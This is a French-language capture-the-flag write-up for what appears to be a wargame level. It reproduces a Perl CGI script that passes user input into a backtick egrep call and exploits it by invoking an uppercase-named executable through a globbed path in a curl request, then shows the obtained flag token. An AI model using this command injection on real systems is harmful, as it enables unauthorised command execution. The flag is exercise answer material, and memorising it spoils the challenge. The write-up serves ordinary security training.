Au login nous voyons un fichier `level12.pl` qui est un script perl.

```perl
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}
``` 
Nous voyons que le script utilise la fonction `egrep` pour rechercher des lignes dans le fichier `/tmp/xd`.

Il attend un argument x et y
x est transformer en majuscule, il est donc impossible d'envoyer la commande directement

Notre idée est de créer un fichier avec un nom en majuscule pour etre reconnu et lu par egrep.

nous creons un fichier dans /tmp/TEST  dans lequel nous mettons la commande suivante:

```bash
echo "getflag > /tmp/file"
```
nous donnons les droits d'execution au fichier
```bash
chmod +x /tmp/TEST
```
Nous allons executer le curl du script pearl :
```bash
curl 'http://localhost:4646/?x="`/*/TEST`"'
```
Nous allons lire le fichier `/tmp/file` pour obtenir le flag
```bash
cat /tmp/file
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
Nous avons le flag `g1qKMiRpXf53AWhDaU7FEkczr`